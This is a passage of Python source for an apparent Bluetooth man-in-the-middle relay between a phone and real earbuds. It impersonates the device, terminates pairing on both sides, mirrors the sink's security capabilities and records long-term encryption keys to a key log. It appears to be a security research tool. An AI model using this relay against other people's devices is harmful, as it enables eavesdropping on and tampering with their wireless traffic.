        return await self._connect_bredr_on(self._pair.upstream, ident.address)

    async def _connect_bredr_on(
        self, controller: "HCIController", target_addr: str, *, max_retries: int = 5
    ) -> int:
        """Connect to a BR/EDR target as initiator; return the connection handle.

        Failure statuses (e.g. 0x04 page timeout) retry the whole round; each attempt waits
        self._connect_timeout seconds.

        Race guard: a Connection_Complete from a timed-out old attempt never pollutes the new
        attempt's future/state; only events arriving while in_flight and matching the address
        are consumed.
        """
        addr_le = bytes(reversed(bytes.fromhex(target_addr.replace(":", ""))))
        params = build_create_connection_params(addr_le)
        loop = asyncio.get_running_loop()
        state: dict = {
            "fut": loop.create_future(),
            "handle": None,
            "status": None,
            "in_flight": False,
        }

        def on_event(event: HCIEvent) -> None:
            if event.event_code == EventCode.CONNECTION_COMPLETE:
                p = event.parameters
                if len(p) >= 9 and p[3:9] == addr_le:
                    if not state["in_flight"]:
                        if p[0] == 0x00:
                            # The earbud reconnected on its own in a page gap: record it in
                            # the connection table and reuse it after the check at the top of
                            # the loop (the old behavior treated it as stale and ignored it →
                            # kept paging an already-reconnected earbud, timing out forever)
                            adopted = int.from_bytes(p[1:3], "little")
                            self._bredr_conns[addr_le.hex()] = adopted
                            logger.info(
                                "session[bredr]: 耳机在 page 间隙自行回连 handle=0x%03X,下轮复用",
                                adopted,
                            )
                        else:
                            logger.debug(
                                "忽略迟到的 Connection_Complete(stale), target=%s", target_addr
                            )
                        return
                    state["in_flight"] = False
                    state["status"] = p[0]
                    if not state["fut"].done():
                        if p[0] == 0x00:
                            state["handle"] = int.from_bytes(p[1:3], "little")
                            state["fut"].set_result(True)
                        else:
                            state["fut"].set_result(False)

        self._subscribe("up", on_event)
        try:
            for attempt in range(1, max_retries + 1):
                # The earbud may already have reconnected on its own (in the connection
                # table): reuse it directly instead of paging an already-connected device
                # (real hardware 2026-09-04: the earbud treats upstream as an already-paired
                # phone and auto-reconnects after release; paging again only hits 5×30s
                # timeouts while the phone has long given up and disconnected).
                tracked = self._bredr_conns.get(addr_le.hex())
                if tracked is not None:
                    logger.info(
                        "session[bredr]: 耳机已自行回连 handle=0x%03X,复用现有连接", tracked
                    )
                    return tracked
                state["fut"] = loop.create_future()  # reset before send, so an event can't pre-fire
                state["in_flight"] = True            # set before send, visible to the controller callback
                try:
                    await controller.send_command(
                        HCICommand(opcode=HCI_CREATE_CONNECTION, parameters=params)
                    )
                except Exception:
                    state["in_flight"] = False
                    raise
                try:
                    ok = await asyncio.wait_for(state["fut"], timeout=self._connect_timeout)
                except asyncio.TimeoutError:
                    state["in_flight"] = False
                    ok = False
                    # Cancel even on the final attempt: a timed-out Create_Connection left
                    # uncancelled wedges the controller in initiate state, so the next
                    # connect fails Command Disallowed (see AGENTS.md).
                    try:
                        await asyncio.wait_for(
                            controller.send_command(
                                HCICommand(
                                    opcode=HCI_CREATE_CONNECTION_CANCEL,
                                    parameters=addr_le,
                                )
                            ),
                            timeout=2.0,
                        )
                    except Exception as exc:
                        logger.debug(
                            "Create_Connection_Cancel 失败(可能已自然完成): %s", exc
                        )
                if ok:
                    logger.info("session[bredr]: 已连上目标 %s handle=0x%03X",
                                target_addr, state["handle"])
                    return state["handle"]
                logger.warning(
                    "session[bredr]: Create_Connection 第 %d/%d 次失败 status=%s",
                    attempt, max_retries, state["status"],
                )
            raise RuntimeError(
                f"Create_Connection to {target_addr} failed after {max_retries} attempts"
            )
        finally:
            self._unsubscribe("up", on_event)

    async def _bredr_bring_up(self, link: _LinkState) -> bool:
        """Actively authenticate + encrypt right after the relay is built (real-hardware root
        cause: see _secure_target_link_on).

        Returns True = auth succeeded; False = auth failed (timeout/0x05 etc.), on which
        _run_link drops the local stale key and retries the whole round. A failure to enable
        encryption is not treated as an auth failure (the link is still usable).
        """
        return await self._secure_target_link_on(self._pair.upstream, link.earbud_handle)

    def _bredr_forget_stale_key(self) -> bool:
        """After an auth failure, drop the target-side local stale key (if present and under
        the forget cap).

        Real-hardware experience (2026-09-04 TWS earbuds): when the earbud-side bond is
        stale, Authentication fails with 0x05 and the earbud then self-heals (deletes its own
        bond and re-pairs); the relay must mirror this: drop the local key and retry the whole
        round. Returns True = key forgotten and the caller should redo the round; False = no
        key or cap reached, just go back to waiting.
        """
        ident = self._identities.get("bredr")
        ssp = self._ssp.get("target")
        if ident is None or ssp is None:
            return False
        addr = ident.address
        if not any(k.upper() == addr.upper() for k in ssp._link_keys):
            return False  # plain unpaired failure, no key to drop
        if self._forget_counts.get(addr, 0) >= _MAX_FORGETS_PER_ADDR:
            logger.warning(
                "session[bredr]: 认证失败且遗忘次数已达上限(%d),放弃本轮回等: addr=%s",
                _MAX_FORGETS_PER_ADDR, addr,
            )
            return False
        ssp.forget_key(addr)
        self._forget_counts[addr] = self._forget_counts.get(addr, 0) + 1
        logger.warning(
            "session[bredr]: 认证失败,丢弃本地存储的 target key,按未配对重试: addr=%s",
            addr,
        )
        return True

    async def _mirror_sc_support_once(self) -> None:
        """Mirror the sink's capability into downstream SC host support (once per session).

        After the first successful target pairing, judge the sink's SC capability from the
        Link_Key_Notification key type recorded by SspTermination: 0x04/0x05 = SC-derived key
        (sink supports SC; downstream keeps it on); 0x00-0x03 = legacy (sink has no BR SC).
        Match the selected device's behavior as closely as possible: turn SC host support off
        downstream too, so the phone sees the same capability as the real device. **Only
        affects subsequent phone pairings**; the already-established phone link is unchanged.
        Command failure only warns, no retry.

        The flag is consumed only **after legacy is confirmed**: reusing an existing bond (key
        type unknown) doesn't consume the slot, and a later brand-new legacy pairing in the
        same session can still trigger the mirror.
        """
        if self._sc_mirrored:
            return
        ssp = self._ssp.get("target")
        key_type = ssp.last_link_key_type if ssp is not None else None
        if key_type is None or key_type >= 0x04:
            return  # no pairing yet (existing bond reuse) or sink supports SC: keep downstream on
        self._sc_mirrored = True  # no retry even on failure: once per session
        logger.info(
            "session: 镜像 sink 能力:sink 无 BR SC,下游关闭 SC host support"
            "(仅影响后续手机配对,已建立的链路不变)"
        )
        try:
            await self._pair.downstream.send_command(
                HCI_Write_Secure_Connections_Host_Support_Command(
                    secure_connections_host_support=0x00
                )
            )
        except Exception as exc:
            logger.warning("session: 下游关闭 SC host support 失败: %s", exc)

    async def _ensure_phone_visible(self) -> None:
        """Re-open inquiry+page scan before each round of waiting for the phone (idempotent,
        best-effort).

        Real-hardware experience (2026-09-04): the Intel controller auto-pauses inquiry scan
        while an ACL is up and does **not** resume it after teardown → after the first
        connection, phones often can't find the impersonated device (WQ7035_MITM disappears).
        The reconnect loop re-sends Scan_Enable=0x03 each round to stay visible.
        """
        try:
            await self._pair.downstream.send_command(
                HCICommand(opcode=HCI_WRITE_SCAN_ENABLE, parameters=bytes([0x03]))
            )
        except Exception as exc:
            logger.warning("session: 重开下游 scan 失败: %s", exc)

    async def _secure_target_link_on(
        self, controller: "HCIController", handle: int, *, timeout: float = 15.0
    ) -> bool:
        """Actively authenticate (+pair) the earbud link and enable encryption. Returns True =
        auth succeeded.

        Real-hardware root cause (JBL Live Beam 4, 2026-09-04): the earbud answers every
        AVDTP/RFCOMM L2CAP Connection Request with result=0x0001 (pending) + status=0x0002
        (authorization pending), waiting for **the local side to initiate authentication**;
        SspTermination only passively answers SSP events, and if no one sends
        HCI_Authentication_Requested the earbud disconnects with 0x05 (Authentication Failure)
        after ~30-60s (confirmed by two real-hardware traces at 12:18/22:11).

        Flow: after the relay is built, sleep 1s → Authentication_Requested →
        - local has no bond: Link_Key_Request → SspTermination negative reply → SSP pairing
          (SspTermination has already answered IO_Capability/User_Confirmation; the new key is
          persisted via Link_Key_Notification);
        - local has a bond: auth succeeds directly;
        after AUTH_COMPLETE status=0, Set_Connection_Encryption turns encryption on and the
        earbud's pending profile connections complete.

        On success: reset that address's forget count (auth-failure self-heal: see
        _bredr_forget_stale_key) and mirror the sink's SC capability downstream by the target
        side's key type (_mirror_sc_support_once). On failure return False without killing the
        relay; _run_link decides whether to drop the stale key and retry.
        """
        loop = asyncio.get_running_loop()
        fut: asyncio.Future[int] = loop.create_future()

        def on_event(event: HCIEvent) -> None:
            if (
                event.event_code == EventCode.AUTH_COMPLETE
                and len(event.parameters) >= 1
                and not fut.done()
            ):
                fut.set_result(event.parameters[0])

        self._subscribe("up", on_event)
        try:
            # The link just came up; give the peer a moment to stabilize (the earbud often
            # runs SDP first after connecting)
            await asyncio.sleep(1.0)
            try:
                await controller.send_command(
                    HCICommand(
                        opcode=HCI_AUTH_REQUESTED,
                        parameters=handle.to_bytes(2, "little"),
                    )
                )
            except Exception as exc:
                logger.warning("session: 耳机链路 Authentication_Requested 发送失败: %s", exc)
                return False
            try:
                status = await asyncio.wait_for(fut, timeout=timeout)
            except asyncio.TimeoutError:
                logger.warning("session: 等耳机链路 Authentication_Complete 超时(%ss)", timeout)
                return False
            if status != 0x00:
                logger.warning("session: 耳机链路认证失败 status=0x%02X(配对被拒?)", status)
                return False
            ident = self._identities.get("bredr")
            if ident is not None:
                # Auth succeeded (including existing-bond reuse): reset the forget count,
                # allowing the next round to self-heal again.
                self._forget_counts.pop(ident.address, None)
            await self._mirror_sc_support_once()
            logger.info("session: 耳机链路认证完成,启用加密 handle=0x%03X", handle)
            try:
                await controller.send_command(
                    HCICommand(
                        opcode=HCI_SET_CONNECTION_ENCRYPTION,
                        parameters=handle.to_bytes(2, "little") + bytes([0x01]),
                    )
                )
            except Exception as exc:
                logger.warning("session: 耳机链路 Set_Connection_Encryption 发送失败: %s", exc)
            return True
        finally:
            self._unsubscribe("up", on_event)

    # ------------------------------------------------- mode implementation LE (Task 8)
    async def _accept_le(self) -> "_LeConn":
        return await self._accept_le_on(self._pair.downstream)

    async def _accept_le_on(self, controller: "HCIController") -> "_LeConn":
        """Wait for LE_Connection_Complete / Enhanced; parse handle+role+peer address.

        The first 11 bytes of both subevents share the same layout (one parser serves both):
        status(0) handle(1:3, LE) role(3) peer_type(4) peer_addr(5:11). Passively waits for
        the phone to connect to the impersonated advertisement; the duration is unpredictable
        → use self._accept_timeout (default None = wait indefinitely, not falling back to
        connect_timeout, same semantics as BR accept).
        """
        loop = asyncio.get_running_loop()
        fut: asyncio.Future["_LeConn"] = loop.create_future()

        def on_event(event: HCIEvent) -> None:
            meta = _le_meta_of(event)
            if meta is None:
                return
            subevent_code, p = meta
            if (subevent_code in (LEMetaSubEvent.LE_CONNECTION_COMPLETE,
                                  LEMetaSubEvent.LE_ENHANCED_CONNECTION_COMPLETE)
                    and len(p) >= 11 and p[0] == 0x00 and not fut.done()):
                fut.set_result(_LeConn(
                    handle=int.from_bytes(p[1:3], "little"),
                    role=p[3],
                    peer_addr_type=p[4],
                    peer_addr6=bytes(p[5:11]),
                ))

        self._subscribe("down", on_event)
        logger.info(
            "session[le]: 等待手机连接伪装广播 %s(手机蓝牙列表按此名字/地址"
            "连接,accept_timeout=%s)...",
            self._phone_visible_desc("le"),
            "常驻" if self._accept_timeout is None else f"{self._accept_timeout}s",
        )
        try:
            # wait_for(timeout=None) is equivalent to awaiting fut indefinitely (same
            # semantics as BR accept); a phone that takes 30s+ to connect must not kill the
            # session — the two links don't cascade.
            return await asyncio.wait_for(fut, timeout=self._accept_timeout)
        finally:
            self._unsubscribe("down", on_event)

    async def _connect_le(self) -> int:
        return await self._connect_le_on(self._pair.upstream)

    async def _probe_le_advertising(
        self, controller: "HCIController", addr_le: bytes, *, window: float = 2.5
    ) -> Optional[bool]:
        """Short-window LE scan to probe whether the target is still advertising.

        Returns three states: True = advertising; False = not seen within the window (most
        likely stopped); None = the probe itself failed (no conclusion drawn). Real-hardware
        experience (WQ7035): LE advertising is triggered by BR connection setup and may only
        be sent during a window — when LE reconnect fails, first check whether it's
        advertising at all, give the operator an actionable hint, and don't let a 3×30s
        Create_Connection wait in vain.
        """
        loop = asyncio.get_running_loop()
        seen = loop.create_future()
        # Same prev-forward discipline as the accept probe: forward events unchanged during probing
        prev_on_hci_event = getattr(controller, "_on_hci_event", None)
        prev_on_acl_data = getattr(controller, "_on_acl_data", None)
        prev_on_sco_data = getattr(controller, "_on_sco_data", None)

        def on_event(event: HCIEvent) -> None:
            meta = _le_meta_of(event)
            if meta is None:
                return
            subevent_code, p = meta
            if subevent_code != LEMetaSubEvent.LE_ADVERTISING_REPORT:
                return
            from pybluehost.cli.app.mitm.recon import (  # noqa: PLC0415
                parse_le_advertising_reports,
            )
            for report in parse_le_advertising_reports(p):
                if report.address == addr_le and not seen.done():
                    seen.set_result(True)

        # set_upstream assigns all three callbacks unconditionally: pass the captured
        # prev ACL/SCO callbacks through so the 2.5s probe doesn't null them.
        controller.set_upstream(
            on_hci_event=on_event,
            on_acl_data=prev_on_acl_data,
            on_sco_data=prev_on_sco_data,
        )
        try:
            scan_params = struct.pack("<BHHBB", 0x01, 0x0010, 0x0010, 0x00, 0x00)
            try:
                await controller.send_command(
                    HCICommand(opcode=HCI_LE_SET_SCAN_PARAMS, parameters=scan_params))
                await controller.send_command(
                    HCICommand(opcode=HCI_LE_SET_SCAN_ENABLE,
                               parameters=bytes([0x01, 0x00])))
            except Exception as exc:
                logger.debug("adv 探测的 scan 开启失败: %s", exc)
                return None  # probe unavailable; don't conclude "not advertising" for the target
            try:
                await asyncio.wait_for(seen, timeout=window)
                return True
            except asyncio.TimeoutError:
                return False
        finally:
            try:
                await controller.send_command(
                    HCICommand(opcode=HCI_LE_SET_SCAN_ENABLE,
                               parameters=bytes([0x00, 0x00])))
            except Exception:
                pass
            controller.set_upstream(
                on_hci_event=prev_on_hci_event,
                on_acl_data=prev_on_acl_data,
                on_sco_data=prev_on_sco_data,
            )

    async def _kick_stale_le_target(self) -> None:
        """Send a follow-up HCI_Disconnect to the last earbud LE handle: the earbud side may
        still hold a stale link (local side restarted / link half-dead), and it won't resume
        advertising until it considers itself disconnected."""
        handle = getattr(self, "_last_le_target_handle", None)
        if handle is None:
            return
        try:
            await self._pair.upstream.send_command(
                HCICommand(opcode=HCI_DISCONNECT,
                           parameters=handle.to_bytes(2, "little") + bytes([0x13])))
            logger.info(
                "session[le]: 已对疑似残留的耳机 LE handle=0x%03X 补发断链,"
                "等待其恢复广播", handle)
        except Exception as exc:
            logger.debug("补刀断链失败(handle=0x%03X): %s", handle, exc)
        finally:
            self._last_le_target_handle = None

    async def _connect_le_on(
        self, controller: "HCIController", *, max_retries: int = 3
    ) -> int:
        """LE_Create_Connection to the real earbud; only consumes connection-complete events
        whose peer address matches.

        Same race guard as the BR version: only events arriving while in_flight with a
        matching peer address are consumed; late/unrelated events don't pollute this round.
        Timed-out rounds Cancel before retrying; Cancel takes no parameters (Core Vol 4 Part
        E §7.8.26, unlike the BR version which carries an address parameter).
        """
        ident = self._identities.get("le")
        assert ident is not None
        addr_le = _addr_str_to_le6(ident.address)
        params = build_le_create_connection_params(addr_le, ident.address_type)
        loop = asyncio.get_running_loop()
        state: dict = {"fut": loop.create_future(), "in_flight": False}

        def on_event(event: HCIEvent) -> None:
            meta = _le_meta_of(event)
            if meta is None:
                return
            subevent_code, p = meta
            if (subevent_code in (LEMetaSubEvent.LE_CONNECTION_COMPLETE,
                                  LEMetaSubEvent.LE_ENHANCED_CONNECTION_COMPLETE)
                    and len(p) >= 11 and p[0] == 0x00
                    and bytes(p[5:11]) == addr_le
                    and state["in_flight"] and not state["fut"].done()):
                state["in_flight"] = False
                state["fut"].set_result(int.from_bytes(p[1:3], "little"))

        self._subscribe("up", on_event)
        try:
            for attempt in range(1, max_retries + 1):
                state["fut"] = loop.create_future()  # reset before send, so an event can't pre-fire
                state["in_flight"] = True
                try:
                    await controller.send_command(
                        HCICommand(opcode=HCI_LE_CREATE_CONNECTION, parameters=params))
                except Exception:
                    state["in_flight"] = False
                    raise
                try:
                    handle = await asyncio.wait_for(state["fut"],
                                                    timeout=self._connect_timeout)
                    logger.info("session[le]: 已连上目标 %s handle=0x%03X",
                                ident.address, handle)
                    # Remember this handle: the earbud side may hold a stale link and not
                    # resume advertising; a follow-up disconnect is sent if reconnect fails
                    self._last_le_target_handle = handle
                    return handle
                except asyncio.TimeoutError:
                    state["in_flight"] = False
                    # Cancel even on the final attempt: a timed-out LE_Create_Connection left
                    # uncancelled wedges the controller in initiate state, so the next
                    # connect fails Command Disallowed (see AGENTS.md).
                    try:
                        await asyncio.wait_for(
                            controller.send_command(
                                HCICommand(opcode=HCI_LE_CREATE_CONNECTION_CANCEL)),
                            timeout=2.0)
                    except Exception as exc:
                        logger.debug("LE Create_Connection_Cancel 失败: %s", exc)
                    logger.warning(
                        "session[le]: LE_Create_Connection 第 %d/%d 次失败(超时)",
                        attempt, max_retries)
                    if attempt < max_retries:
                        # Diagnosis: is the target still advertising? (some devices bind their
                        # advertising window to BR connection setup)
                        adv = await self._probe_le_advertising(controller, addr_le)
                        if adv is False:
                            logger.warning(
                                "session[le]: %ds 内未见目标 %s 的 LE 广播——"
                                "此类设备可能只在 BR 建连后的窗口期广播。"
                                "可先断开手机再重连(触发新一轮),或确认设备侧状态",
                                2.5, ident.address)
                            await self._kick_stale_le_target()
                        elif adv is True:
                            logger.info(
                                "session[le]: 目标 %s 仍在广播,继续重试连接"
                                "(可能广播间隔较长)", ident.address)
            raise RuntimeError(f"LE Create_Connection to {ident.address} failed")
        finally:
            self._unsubscribe("up", on_event)

    def _le_relay_extras(self, link: _LinkState) -> None:
        """LE only: real-address ScPairing (phone=responder, target=initiator).

        The address fields are filled first by _build_link's LE branch. Semantics match
        orchestrator._build_relay: the phone sends the Pairing Request → the phone is the SMP
        initiator → the phone side plays responder, and its peer_addr (initiator) = the
        phone's real address; we actively initiate toward the earbud → the target side plays
        initiator.
        """
        link.pairings = {
            "phone": ScPairing(role="responder",
                               local_addr=link.phone_addr7,
                               peer_addr=link.phone_peer7,
                               delegate=self._delegate, side_name="phone"),
            "target": ScPairing(role="initiator",
                                local_addr=link.target_addr7,
                                peer_addr=link.target_peer7,
                                delegate=self._delegate, side_name="target"),
        }

    def _make_smp_handler(self, link: _LinkState) -> SmpHandler:
        """Assemble the SMP bridge (ported from
        orchestrator._build_relay/_make_smp_emitter/_drain_smp):

        One queue + drain task per side (preserves same-side PDU order); pairing.set_output
        only enqueues; smp_handler feeds the CID-0x0006 PDUs received on a side to that
        **same side's** pairing — SMP is terminated locally, never forwarded to the peer.
        Queues/drain tasks hang on the link and are cancelled with the link's teardown.
        """
        link.smp_queues = {"phone": asyncio.Queue(), "target": asyncio.Queue()}
        for name in ("phone", "target"):
            link.drain_tasks.append(
                asyncio.ensure_future(self._drain_le_smp(link, name)))
        for name, pairing in link.pairings.items():
            q = link.smp_queues[name]
            pairing.set_output(lambda pdu, _q=q: _q.put_nowait(pdu))

        async def smp_handler(side_name: str, cid: int, payload: bytes) -> None:
            pairing = link.pairings.get(side_name)
            if pairing is None:
                logger.warning("session[le]: 未知侧 %r 的 SMP PDU,丢弃", side_name)
                return
            await pairing.feed(payload)

        return smp_handler

    async def _drain_le_smp(self, link: _LinkState, name: str) -> None:
        """Serially consume one side's SMP queue: encode L2CAP (CID 0x0006) → fragment → send
        via that side's controller."""
        if name == "phone":
            side_ctl, handle = self._pair.downstream, link.phone_handle
            max_payload = (side_ctl.le_acl_packet_length
                           or side_ctl.acl_packet_length or 27)
        else:
            side_ctl, handle = self._pair.upstream, link.earbud_handle
            max_payload = (side_ctl.le_acl_packet_length
                           or side_ctl.acl_packet_length or 27)
        queue = link.smp_queues[name]
        while True:
            pdu = await queue.get()
            try:
                l2 = encode_l2cap_basic(CID_SMP, pdu)
                for frag in fragment(handle=handle, l2cap_pdu=l2, max_payload=max_payload):
                    await side_ctl.send_acl_data(frag.handle, frag.pb_flag, frag.data)
            except Exception:
                logger.exception("session[le]: 发送 %s 侧 SMP 失败", name)
            finally:
                queue.task_done()

    async def _le_bring_up(self, link: _LinkState) -> None:
        """After the link is ready, drive SMP as needed and enable encryption on the earbud.

        By default (self._le_target_initiate_pairing=False) it does not actively initiate
        pairing toward the target: plain unencrypted GATT doesn't need the relay to pair
        first, and a peripheral (measured on NRF_EPD_7D4D) answers an unsolicited SMP Pairing
        Request with a 0x3E disconnect within ~0.24s. If the phone wants encryption it
        initiates via the SMP bridge itself (the phone-side pairing is driven by the bridge);
        in that case the target side's LTK can only come from an active pairing after this
        flag is set True.
        """
        if not self._le_target_initiate_pairing:
            logger.info("session[le]: 纯 GATT 透传,跳过主动 target 配对/加密")
            return
        # The initiator (target side) starts SMP; the phone (responder) side waits for the
        # phone's Pairing Request.
        await link.pairings["target"].start()
        # Wait for the target side to get the LTK → LE_Start_Encryption (~20s cap).
        # ScPairing sets both ltk and complete at the step where the DHKey check passes, so
        # checking ltk suffices (unit tests that inject ltk directly take the same trigger path).
        pairing = link.pairings["target"]
        for _ in range(2000):
            if pairing.ltk is not None:
                break
            await asyncio.sleep(0.01)
        if pairing.ltk is not None:
            # LE_Start_Encryption: handle(2) || rand(8) || ediv(2) || ltk(16);SC: rand/ediv=0
            params = (link.earbud_handle.to_bytes(2, "little")
                      + bytes(8) + bytes(2) + pairing.ltk)
            await self._pair.upstream.send_command(
                HCICommand(opcode=HCI_LE_START_ENCRYPTION, parameters=params))
            self._save_le_ltk("target", link, pairing.ltk)
            if (link.pairings["phone"].is_complete()
                    and link.pairings["phone"].ltk is not None):
                self._save_le_ltk("phone", link, link.pairings["phone"].ltk)
        else:
            logger.warning("session[le]: target 配对未完成,跳过 LE_Start_Encryption")

    def _on_phone_ltk_request(self, handle: int, rand: bytes, ediv: int) -> None:
        """The phone initiates encryption toward us → answer with the phone-side pairing's LTK
        (same semantics as the orchestrator)."""
        link = self._le
        ltk = None
        if link is not None and handle == link.phone_handle:
            ltk = link.pairings["phone"].ltk or self._load_le_ltk("phone", link)
        if ltk is None:
            logger.warning("session[le]: phone LTK 未就绪,忽略 LE_LTK_Request handle=0x%03X",
                           handle)
            return
        asyncio.ensure_future(self._pair.downstream.send_command(
            HCICommand(opcode=HCI_LE_LONG_TERM_KEY_REQUEST_REPLY,
                       parameters=handle.to_bytes(2, "little") + ltk)))

    def _load_le_ltk(self, side: str, link: _LinkState) -> bytes | None:
        peer7 = link.phone_peer7 if side == "phone" else link.target_peer7
        addr = ":".join(f"{b:02X}" for b in peer7[1:])
        return self._ltks.get((side, addr))

    def _save_le_ltk(self, side: str, link: _LinkState, ltk: bytes) -> None:
        peer7 = link.phone_peer7 if side == "phone" else link.target_peer7
        addr = ":".join(f"{b:02X}" for b in peer7[1:])
        self._ltks[(side, addr)] = ltk
        if self._key_log:
            append_ltk(self._key_log, side=side, addr=addr, ltk=ltk)

    # ------------------------------------------------------------- disconnect/teardown
    async def _graceful_disconnect(
        self, controller: "HCIController", handle: int, *, timeout: float = 2.0
    ) -> None:
        await self._graceful_disconnect_on(controller, handle, timeout=timeout)

    async def _graceful_disconnect_on(
        self, controller: "HCIController", handle: int, *, timeout: float = 2.0
    ) -> None:
        """Ensure the link is down before exit/teardown: send a follow-up HCI_Disconnect
        (idempotent) and wait for Disconnection_Complete.

        Real-hardware lesson (BE200): exiting a process with a live ACL hangs the dongle
        firmware (the next init's HCI Reset gets no response; only a replug recovers). The
        link may already have been torn down by the watch's cascading disconnect; here we send
        an idempotent disconnect and wait for the event to land before handing back the USB.
        """
        loop = asyncio.get_running_loop()
        fut: asyncio.Future[None] = loop.create_future()
        side = "down" if controller is self._pair.downstream else "up"

        def on_event(event: HCIEvent) -> None:
            if event.event_code == EventCode.DISCONNECTION_COMPLETE:
                p = event.parameters
                if (
                    len(p) >= 4
                    and int.from_bytes(p[1:3], "little") == handle
                    and not fut.done()
                ):
                    fut.set_result(None)

        self._subscribe(side, on_event)
        try:
            try:
                await controller.send_command(
                    HCICommand(
                        opcode=HCI_DISCONNECT,
                        # reason 0x13: 0x16 is an event-side code; BE200 rejects it with 0x12.
                        parameters=handle.to_bytes(2, "little") + bytes([0x13]),
                    )
                )
            except Exception:
                # The controller returns an error status when the link is already down — the
                # idempotent goal is already met.
                logger.debug("HCI_Disconnect handle=0x%03X 报错(可能已断)", handle)
            try:
                await asyncio.wait_for(fut, timeout=timeout)
            except asyncio.TimeoutError:
                logger.debug(
                    "等 Disconnection_Complete 超时 handle=0x%03X(可能已断)", handle
                )
        finally:
            self._unsubscribe(side, on_event)

    async def teardown(self) -> None:
        # First stop both links' relays (drop leftover egress), then close scan, then close
        # capture / pair. pair.close() already does a concurrent HCI_Reset on both dongles
        # (the BE200 wedge lesson), so no need to repeat it.
        for link in (self._br, self._le):
            if link is not None:
                try:
                    await link.relay.stop()
                except Exception:
                    logger.exception("session: relay stop 失败")
        for side, ctl in (("downstream", self._pair.downstream),
                          ("upstream", self._pair.upstream)):
            try:
                await asyncio.wait_for(
                    ctl.send_command(
                        HCICommand(opcode=HCI_WRITE_SCAN_ENABLE, parameters=bytes([0x00]))
                    ),
                    timeout=2.0,
                )
            except Exception:
                logger.debug("%s 关 scan 失败(控制器可能已异常)", side)
        try:
            await self._capture_close()
        except Exception:
            # A capture close failure (e.g. disk/path error) must never block the pair.close()
            # that follows — that's the BE200 wedge defense line (concurrent HCI_Reset on both
            # dongles).
            logger.exception("session: capture close 失败")
        try:
            await self._pair.close()
        except Exception:
            logger.exception("session: pair close 失败")

    async def _capture_close(self) -> None:
        await self._capture.close()
